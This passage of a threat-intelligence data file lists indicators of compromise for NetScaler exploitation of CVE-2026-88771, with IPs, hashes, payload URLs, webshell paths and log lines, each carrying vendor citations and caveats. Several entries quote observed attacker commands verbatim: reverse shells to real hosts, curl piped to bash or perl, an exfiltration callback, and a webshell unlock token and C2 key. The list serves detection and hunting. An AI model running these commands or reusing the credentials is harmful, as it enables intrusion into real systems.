  { type: 'IPv4', value: '95.229.84.239', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Telecom Italia S.p.A., Italy)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '113.137.102.68', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (CHINANET BACKBONE, China)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '47.243.125.255', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '47.76.92.109', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '8.217.173.25', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '8.210.67.91', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '47.239.205.29', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '47.76.132.65', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '8.218.219.56', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '47.76.102.1', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '47.76.63.52', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '8.210.119.74', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Alibaba (US) Technology Co., Ltd., Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '64.177.93.71', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (The Constant Company, LLC, Mexico)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '44.252.255.141', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Amazon.com, Inc., United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '194.242.130.193', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (WAHYU, Hong Kong)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '125.122.56.47', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (CHINANET BACKBONE, China)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '23.132.164.35', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Netiface America, Inc., Switzerland)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '92.118.204.229', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Catixs Ltd, United States). LevelBlue: source of command-execution testing (e.g. whoami)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.' + LB_NOTE, cite: ['gntag', 'levelblue'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '54.70.59.128', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Amazon.com, Inc., United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '44.226.128.41', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Amazon.com, Inc., United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '4.246.63.96', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Microsoft Corporation, United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '176.65.148.54', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Pfcloud UG, Netherlands)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '104.28.193.147', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 29 (Cloudflare, Inc., Japan)', caveat: WARP_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '104.28.211.105', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 29 (Cloudflare, Inc., Japan)', caveat: WARP_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'User-Agent', value: 'Python-urllib', context: 'Client used for CVE-2026-88771 log-poison exploitation on Lupovis decoys (payload runs id;uname, DNS callback to httpworkbench)', caveat: LUP_CAVEAT + ' Python-urllib is a common library default; only meaningful together with the auth-endpoint payload.', cite: ['lupovisx'], share: 'Public post, no TLP marking' },
  { type: 'URI path', value: '/vpn/scripts/linux/nsgclient18.deb', context: 'GET requests referenced in a NetScaler Console IoC scanner finding (Maurice_Sec field notes)', caveat: 'Single practitioner report; the author is "not 100%" on this finding. Matches the GTIG nsgclient*.deb staging pattern. A legitimate client package normally lives at similar paths, so check file content, not just the name.', cite: ['maurice', 'cybermaxx', 'gtig', 'unit42'], share: 'Public post, no TLP marking' },
  { type: 'URI path', value: '/vpn/scripts/linux/nsgclient18_32.deb', context: 'GET requests referenced in a NetScaler Console IoC scanner finding (Maurice_Sec field notes)', caveat: 'Single practitioner report; the author is "not 100%" on this finding. Matches the GTIG nsgclient*.deb staging pattern. Check file content, not just the name.', cite: ['maurice', 'cybermaxx', 'gtig'], share: 'Public post, no TLP marking' },
  { type: 'Domain', value: 'echvista.com', context: 'Associated exploit source (IFIN compiled observables)', caveat: IFIN_CAVEAT + ' No A record when checked on Sep 29.', cite: ['ifin'], share: 'Public, no restriction' },
  { type: 'SHA-256', value: '73b74309f4728d169cc9edfb2767c5aadd75d39b62de93c935a86c777d2646bc', context: 'First payload returned from /xd7h/x', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'SHA-256', value: '9c7bf01d2c2cb31a3609d27c1bc9abc60d86e37b7f9908547e0c75fb18b99aab', context: 'nsmon.pl Perl implant returned from /xd7h/nsmon.pl', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'SHA-256', value: '57f9f30c50240fd48d761de7961a430cdebf2c084a36bc76d376a1ce8e6dfa9d', context: 'Initial payload in a separate observation involving 62.133.62.80', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'SHA-256', value: '974b69782fdf5d67b97cfd508465939e44ee10798dbcc1e82b92d78776bad938', context: 'Perl script update_c08937.pl', caveat: AW_CAVEAT + LB_NOTE, cite: ['arcticwolf', 'levelblue'], share: AW_SHARE },
  { type: 'SHA-256', value: '927c7fbef2e620c1ce482c3ed67ebf53da97693c1d6c7552c77aec84ba982cf8', context: 'Platypus agent (shell script) retrieved from entretiensol.com', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'IPv4', value: '45.141.21.130', context: 'Reverse-shell destination: /bin/sh -i to port 443', caveat: AW_CAVEAT + LB_NOTE, cite: ['arcticwolf', 'levelblue'], share: AW_SHARE },
  { type: 'IPv4', value: '68.178.160.183', context: 'Payload host on ports 8888 and 8899 (/test, /test111)', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'IPv4', value: '89.44.80.7', context: 'Callback host: /exec-ok and Base64 id output on port 65456; nc -e /bin/sh to port 58963', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'IPv4', value: '130.94.42.226', context: 'Callback on port 18805', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'IPv4', value: '134.175.71.50', context: 'Payload host on port 4123', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'IPv4', value: '177.4.12.11', context: 'Served /s?t=a, b and c on port 8080, piped to sh', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://64.94.85.67:443/update_c08937.pl', context: 'Fetched with curl and piped to perl inside the injected username', caveat: AW_CAVEAT + LB_NOTE, cite: ['arcticwolf', 'levelblue'], share: AW_SHARE },
  { type: 'URL', value: 'http://62.133.62.80:80/xd7h/x', context: 'First payload fetched by the appliance', caveat: AW_CAVEAT + LB_NOTE, cite: ['arcticwolf', 'levelblue'], share: AW_SHARE },
  { type: 'URL', value: 'http://62.133.62.80:80/xd7h/nsmon.pl', context: 'nsmon.pl implant download', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://23.27.143.20:9000/main.py', context: 'Python payload download', caveat: AW_CAVEAT + LB_NOTE, cite: ['arcticwolf', 'levelblue'], share: AW_SHARE },
  { type: 'URL', value: 'http://153.75.82.220/download/x.sh', context: 'Shell payload, piped to bash', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'Domain', value: 'entretiensol.com', context: 'Served a Platypus agent over HTTPS (/api/v1/install/...)', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'File path', value: '/var/tmp/.nsmon/nsmon.pl', context: 'nsmon.pl copies itself here with 0755 permissions', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'File path', value: '/var/1.py', context: 'main.py saved here before execution', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'File path', value: '/var/tmp/.s', context: 'File path listed by Arctic Wolf', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'Cron entry', value: '*/5 * * * * root perl /var/tmp/.nsmon/nsmon.pl', context: 'Cron entry nsmon.pl attempts to add to /etc/crontab or /nsconfig/crontab (attempted persistence)', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'Network', value: 'TCP listener on 41000-41999', context: 'nsmon.pl attempts to listen on 0.0.0.0 on a configured port or a free port in this range', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'IPv4', value: '78.47.24.217', context: 'Fingerprinting 21-22 Aug; part of the 21 Sep three-stage webshell drop', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '66.135.19.18', context: 'One of four VPSs (one per day, 4-8 Sep) requesting nsgclient18.deb and nsgser18.deb', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '167.99.111.203', context: 'One of four VPSs (one per day, 4-8 Sep) requesting nsgclient18.deb and nsgser18.deb', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '142.93.85.227', context: 'One of four VPSs (one per day, 4-8 Sep) requesting nsgclient18.deb and nsgser18.deb', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '104.248.74.206', context: 'One of four VPSs (one per day, 4-8 Sep) requesting nsgclient18.deb and nsgser18.deb', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '137.184.91.207', context: 'Requested the same .deb files on 7 Sep', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '162.33.178.9', context: 'Requested nsgbuild.deb and nsgsupport.deb on 14 Sep', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '193.149.176.207', context: 'Requested nsgbuild.deb daily 15-24 Sep (most of the requests Unit 42 saw) and GetUserName', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '45.61.136.143', context: 'Listed in the Unit 42 network indicators', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '66.227.183.84', context: 'Listed in the Unit 42 network indicators', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '216.245.184.164', context: 'Listed in the Unit 42 network indicators', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '104.28.215.137', context: 'Requested .deb webshell files 9-11 Sep; GetUserName stream (Cloudflare WARP)', caveat: WARP_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '104.28.247.136', context: 'Requested .deb webshell files 9-11 Sep; GetUserName stream (Cloudflare WARP)', caveat: WARP_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '104.28.215.136', context: 'Requested .deb webshell files 9-11 Sep; GetUserName stream (Cloudflare WARP)', caveat: WARP_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '104.28.247.137', context: 'GetUserName request stream 10-27 Sep (Cloudflare WARP)', caveat: WARP_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'SHA-256', value: 'ae22ef2517b5c0fb47f78745b9cb5260acee0e751b89bcd354640ff8bc8d29ec', context: 'nsg64.deb PHP webshell: RC4-encrypted C2 with exec, upload and file exfiltration; privilege escalation through the legitimate SUID binary /var/netscaler/.ns_suidcmd', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'SHA-256', value: '1bd314b661396c7086f6367fbbb48025e03ca2de69c073d53a8b0a38aa5fbb7d', context: 'Text of Unit 42 Figure 1 (Base64 payload)', caveat: U42_CAVEAT + ' Hash of a text file reproducing the figure, so it will not match on-disk artefacts.', cite: ['unit42'], share: U42_SHARE },
  { type: 'SHA-256', value: '79c65fa04541032e251fa4796b97800374b63c7982593dd1a2e0db605d429186', context: 'Text of Unit 42 Figure 2 (decoded shell script)', caveat: U42_CAVEAT + ' Hash of a text file reproducing the figure, so it will not match on-disk artefacts.', cite: ['unit42'], share: U42_SHARE },
  { type: 'URI path', value: '/vpn/scripts/linux/nsg64.deb', context: '.deb webshell name requested 4-24 Sep', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'URI path', value: '/vpn/scripts/linux/nsgser18.deb', context: '.deb webshell name requested 4-24 Sep', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'URI path', value: '/vpn/scripts/linux/nsgsupport.deb', context: '.deb webshell name requested 4-24 Sep', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'URI path', value: '/vpn/scripts/linux/nsgpackage64.deb', context: '.deb webshell name requested 4-24 Sep', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'URI path', value: '/vpn/scripts/linux/nsgbuild.deb', context: '.deb webshell name requested 4-24 Sep', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'URI path', value: '/logon/LogonPoint/Authentication/GetUserName', context: 'Continuous request stream 10-27 Sep; Unit 42 believes any activity to this path is anomalous', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'URI path', value: '/admin_ui/common/css/ns/ui.css', context: 'Requested 21-22 Aug for version fingerprinting', caveat: 'Legitimate NetScaler file used for fingerprinting, not an IoC on its own. Hunt for requests from the listed IPs or unusual sources.', cite: ['unit42'], share: U42_SHARE },
  { type: 'URI path', value: '/vpn/js/rdx/core/lang/rdx_en.json.gz', context: 'Requested 21-22 Aug for version fingerprinting', caveat: 'Legitimate NetScaler file used for fingerprinting, not an IoC on its own. Hunt for requests from the listed IPs or unusual sources.', cite: ['unit42'], share: U42_SHARE },
  { type: 'Cookie value', value: 'e826d7ddf3c85920', context: 'CsrfToken value that unlocks the .ctxs.receiver webshell; the NSC_TASS cookie carries the command', caveat: U42_CAVEAT + ' Unit 42 calls it a per-implant password; other intrusions may use other tokens.', cite: ['unit42'], share: U42_SHARE },
  { type: 'RC4 key', value: '7489a0f93c67fa5cdaeb4b921d90594d', context: 'nsg64.deb C2 key: MD5 of the hard-coded passphrase Rhfajaf1H992; operators authenticate with the k parameter', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'Command', value: 'chmod 6555 /bin/sh', context: 'First step of the decoded .ctxs.receiver installer: sets SUID and SGID on /bin/sh', caveat: U42_CAVEAT, cite: ['unit42'], share: U42_SHARE },
  { type: 'IPv4', value: '45.76.34.141', context: 'Sygnia confidence High: observed in malicious AAA events', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'IPv4', value: '170.64.176.26', context: 'Sygnia confidence High: associated with activity in an active IR investigation', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'IPv4', value: '209.250.236.77', context: 'Sygnia confidence Medium: time-correlated with exploit-style activity', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'IPv4', value: '138.68.21.29', context: 'Sygnia confidence Medium: strong temporal and service-path correlation', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'File path', value: '/var/netscaler/gui/vpn/scripts/linux/1bd8a664.sig', context: 'Suspicious .sig file in a web-accessible directory', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'File path', value: '/netscaler/ns_gui/vpn/c88771.json', context: 'Suspicious JSON artefact in the VPN web directory', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'File path', value: '/var/netscaler/logon/insight-new.js', context: 'Target of an attempted copy of /flash/nsconfig/ns.conf (configuration exposure)', caveat: SYG_CAVEAT + LB_NOTE, cite: ['sygnia', 'levelblue'], share: SYG_SHARE },
  { type: 'File name', value: '80974ca9.sig', context: 'Artefact in a NetScaler web-accessible directory', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'File name', value: 'LoginIcon.sig', context: 'Artefact in a NetScaler web-accessible directory', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'Apache directive', value: 'AddHandler application/x-httpd-php .css', context: 'Makes CSS-looking files run as PHP', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'Apache directive', value: 'AddHandler application/x-httpd-php .ico', context: 'Makes icon-looking files run as PHP', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'NetScaler log line', value: 'AAA LOGIN_FAILED: User pitboss PPE unexpectedly died NSPPE;curl http://64.94.85.67:443/update_c08937.pl | perl;# X - Client_ip 64.94.85.67 - Failure_reason "External authentication server denied access"', context: 'Failed login with the injected command as the username. Appliance-side line from production telemetry; the same pattern Lupovis saw in HTTP bodies on its decoys.', caveat: AW_CAVEAT + ' Shows the command reached the authentication logging path, not that it ran; correlate with process and file evidence.', cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'NetScaler log line', value: 'AAA LOGIN REQ: parsed data; username: <pitboss PPE unexpectedly died NSPPE;curl http://64.94.85.67:443/update_c08937.pl | perl;# X>', context: 'AAA parses the injected username. Appliance-side line from production telemetry; the same pattern Lupovis saw in HTTP bodies on its decoys.', caveat: AW_CAVEAT + ' Shows the command reached the authentication logging path, not that it ran; correlate with process and file evidence.', cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'NetScaler log line', value: 'AAAD API: sending login req to aaad for <pitboss PPE unexpectedly died NSPPE;curl http://64.94.85.67:443/update_c08937.pl | perl;# X>, factor <...>, auth type 4129', context: 'SSLVPN message passing the username to aaad. Appliance-side line from production telemetry; the same pattern Lupovis saw in HTTP bodies on its decoys.', caveat: AW_CAVEAT + ' Shows the command reached the authentication logging path, not that it ran; correlate with process and file evidence.', cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'NetScaler log line', value: 'Authentication delegated to Packet engine for pitboss PPE unexpectedly died NSPPE;curl http://64.94.85.67:443/update_c08937.pl | perl;# X, trying to find appropriate action with bitmask 1', context: 'AAATM message. Appliance-side line from production telemetry; the same pattern Lupovis saw in HTTP bodies on its decoys.', caveat: AW_CAVEAT + ' Shows the command reached the authentication logging path, not that it ran; correlate with process and file evidence.', cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://31.56.197.72:9090/lula', context: 'Payload URL', caveat: AW_CAVEAT + LB_NOTE, cite: ['arcticwolf', 'levelblue'], share: AW_SHARE },
  { type: 'URL', value: 'http://31.56.197.72/lula', context: 'Payload URL', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://31.56.197.72/kk', context: 'Payload URL', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://68.178.160.183:8899/test111', context: 'Payload URL', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://68.178.160.183:8888/test', context: 'Payload URL', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://89.44.80.7:65456/exec-ok', context: 'Execution-check callback', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://89.44.80.7:65456/$(id|base64 -w0)', context: 'Callback carrying Base64 id output', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://130.94.42.226:18805/?t=<REDACTED>', context: 'Callback (token redacted by Arctic Wolf)', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://134.175.71.50:4123/1', context: 'Payload URL', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://177.4.12.11:8080/s?t=a', context: 'Fetched with curl -sk and piped to sh', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://177.4.12.11:8080/s?t=b', context: 'Fetched with curl -sk and piped to sh', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'http://177.4.12.11:8080/s?t=c', context: 'Payload URL', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URL', value: 'https://entretiensol.com:443/api/v1/install/<REDACTED>', context: 'Platypus agent install, fetched with curl -fsSL --tlsv1.2 -k (path redacted by Arctic Wolf)', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'Command', value: '/bin/sh -i >& /dev/tcp/45.141.21.130/443 0>&1', context: 'Bash reverse shell, observed in the injected username', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'Command', value: 'nc -e /bin/sh 89.44.80.7 58963', context: 'Netcat reverse shell, observed in the injected username', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'Command', value: 'id|base64 -w0', context: 'Command-output exfiltration over HTTP, observed in the injected username', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'Command', value: 'curl -fsSL http://153.75.82.220/download/x.sh | bash', context: 'Remote shell script execution, observed in the injected username', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'Command', value: 'curl -sk 177.4.12.11:8080/s?t=a|sh', context: 'Remote shell script execution, observed in the injected username', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'IPv4', value: '70.172.58.168', context: 'Source of NetScaler exploitation attempts', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'IPv4', value: '162.243.36.88', context: 'Source of NetScaler exploitation attempts', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'IPv4', value: '173.40.135.209', context: 'Source of NetScaler exploitation attempts', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'IPv4', value: '47.230.224.154', context: 'Source of NetScaler exploitation attempts', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'SHA-256', value: 'e9fe43968c6c0955300e3bc4d7fb0b05a18570b4733aaf4f5c6f7f09be5a242c', context: 'main.py: overwrites /var/python/bin/customsnmpd with a Python reverse shell to 45.141.21.130:443 and kills the running customsnmpd', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'URL', value: 'http://64.94.85.67:443/update_result_3567cs.tgz', context: 'Upload target for the archived /flash/nsconfig (attempted upload; LevelBlue does not confirm the data left)', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'File path', value: '/tmp/update_result_3567cs.tgz', context: 'Archive of /flash/nsconfig staged by update_c08937.pl, then deleted with the script itself; absence does not mean it did not run', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'File path', value: '/var/netscaler/logon/LogonPoint/.local_journal', context: 'PHP webshell (command execution, upload, download) installed by update_c08937.pl', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'File path', value: '/var/netscaler/logon/LogonPoint/xua.html', context: 'tar archive of /flash/nsconfig written into the web directory (configuration staging)', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'File path', value: '/var/python/bin/customsnmpd', context: 'Overwritten by main.py with a reverse shell; unexpected modification or execution is a lead', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'Account', value: 'sec_monitor', context: 'Local superuser added to /flash/nsconfig/ns.conf by update_c08937.pl', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'URL alias', value: 'LogonUISimple.html.style.min.css', context: 'CSS-looking alias (and hex variants) mapped in httpd.conf to the .local_journal webshell', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'Log string', value: 'pitboss PPE unexpectedly died NSPPE;whoami;# X', context: 'Command-execution test in an authentication username', caveat: LB_CAVEAT, cite: ['levelblue'], share: LB_SHARE },
  { type: 'File path', value: '/var/tmp/.nsmon/.cfg', context: 'nsmon.pl configuration values', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'File path', value: '/var/tmp/.nsmon/.state', context: 'nsmon.pl state file used to check whether a recorded process is still running', caveat: AW_CAVEAT, cite: ['arcticwolf'], share: AW_SHARE },
  { type: 'URI path', value: '/logon/LogonPoint/custom/receiver.min..css', context: 'Request path as listed by Sygnia (two dots), consistent with the receiver.min.<hex>.css webshell alias', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'Log string', value: 'pitboss PPE unexpectedly died NSPPE;', context: 'Sygnia confidence High: new command-injection variant', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'Log string', value: 'pitboss PPE missed too many heartbeats NSPPE;', context: 'Sygnia confidence High: heartbeat loader variant', caveat: SYG_CAVEAT, cite: ['sygnia'], share: SYG_SHARE },
  { type: 'IPv4', value: '195.123.233.245', context: 'Primary Platypus C2 node (443); entretiensol.com and white-guard.pro resolve here', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'IPv4', value: '38.180.81.157', context: 'C2 node sharing the cluster certificate', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'IPv4', value: '95.133.231.109', context: 'C2 node sharing the cluster certificate', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'IPv4', value: '104.200.67.56', context: 'C2 node sharing the cluster certificate', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
